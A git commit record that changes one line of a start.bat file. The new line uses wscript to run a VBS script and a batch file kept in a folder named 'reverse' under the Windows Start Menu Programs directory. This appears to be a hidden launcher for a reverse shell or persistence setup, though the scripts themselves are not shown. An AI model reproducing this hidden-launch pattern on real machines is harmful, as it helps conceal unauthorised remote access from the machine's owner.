7dc4223a7ee2f4add95344fe5cf1c4e90b9624fc
strongpapazola <48545591+strongpapazola@users.noreply.github.com>
2020-07-12 22:41:58 +0700

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,1 +1,1 @@
-wscript ..\reverse\1.vbs ..\reverse\2.bat %*
+wscript C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\1.vbs C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\2.bat %*
